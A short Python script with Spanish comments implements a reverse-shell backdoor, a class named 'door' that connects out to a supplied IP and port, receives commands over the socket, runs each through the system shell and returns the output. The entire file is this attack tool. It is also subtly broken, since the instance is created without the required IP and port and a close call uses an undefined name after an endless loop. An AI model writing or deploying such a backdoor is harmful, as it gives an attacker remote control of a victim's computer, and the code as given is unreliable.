import socket
import subprocess

class door:
    def __init__(self,ip, puerto): # Conectarse a la computadora
        self.access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
        self.access.connect( (ip, puerto) )
    
    def command_func(self, command): # Hacer que los comandos funcionen
        return subprocess.check_output(command, shell=True)
        
    def run_commands(self): # Correr comandos y recibir datos
        while True:
            command = self.access.recv(1024).decode()
            command_result = self.command_func(command)
            self.access.send(command_result)
        access.close()

door_real = door() # Colocar IP
door_real.run_commands()
